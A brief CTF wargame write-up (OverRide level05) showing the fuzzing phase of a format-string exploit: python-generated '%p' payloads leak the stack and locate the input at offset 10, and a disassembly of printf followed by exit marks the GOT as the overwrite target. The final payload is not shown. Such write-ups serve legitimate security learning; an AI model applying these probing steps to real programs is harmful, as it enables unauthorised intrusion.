
fuzzing phase

```
level05@OverRide:~$ ./level05
ssss
ssss

obiously some format string here

level05@OverRide:~$ ./level05
%p %p %p

level05@OverRide:~$ (python -c 'print "AAAA" + " %p " * 10') | ./level05
aaaa 0x64  0xf7fcfac0  0xf7ec3af9  0xffffd6bf  0xffffd6be  (nil)  0xffffffff  0xffffd744  0xf7fdb000  0x61616161

level05@OverRide:~$ (python -c 'print "AAAA" + " %10$p "') | ./level05
aaaa 0x61616161
```

lets jump into jdb 

```
   0x08048507 <main+195>:	call   0x8048340 <printf@plt>
   0x0804850c <main+200>:	movl   $0x0,(%esp)
   0x08048513 <main+207>:	call   0x8048370 <exit@plt>
   
   its GOT obviously
```





















